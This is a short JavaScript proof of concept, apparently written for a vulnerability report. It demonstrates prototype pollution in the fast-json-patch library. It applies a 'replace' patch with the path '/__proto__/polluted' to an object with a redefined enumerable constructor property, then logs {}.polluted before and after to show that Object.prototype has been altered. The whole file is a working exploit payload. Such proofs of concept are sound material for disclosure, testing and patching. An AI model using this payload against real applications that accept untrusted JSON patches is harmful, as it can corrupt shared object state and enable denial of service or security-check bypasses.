var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
let fp = require('fast-json-patch');
const patch = [{
        op: 'replace',
        path: '/__proto__/polluted',
        value: 'yes'
    }];
console.log({}.polluted);
fp.applyPatch(obj, patch);
console.log({}.polluted);